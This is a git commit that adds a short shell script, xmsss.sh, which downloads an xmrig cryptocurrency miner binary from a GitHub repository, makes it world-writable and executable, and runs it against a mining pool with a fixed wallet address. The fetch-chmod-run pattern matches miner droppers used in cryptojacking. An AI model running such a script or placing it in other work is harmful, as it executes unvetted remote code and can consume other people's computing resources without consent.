23402a0ac8c13f26caaaf28884d20b36288c17d5
Jasiel Pereira de Sant' ana <jasiellp@hotmail.com>
2021-04-09 17:32:10 -0300

    Create xmsss.sh

---
+++ xmsss.sh
@@ -0,0 +1,5 @@
+wget https://github.com/jasiellp/mg/raw/master/xmrig
+
+chmod  +777 xmrig
+
+./xmrig -a randomx -o stratum+tcp://yescrypt.na.mine.zpool.ca:6233 -u D8uQ9VPJ5dRRatyy2Yr8yBbLXFCbC533m5 -p c=DGB_linux1
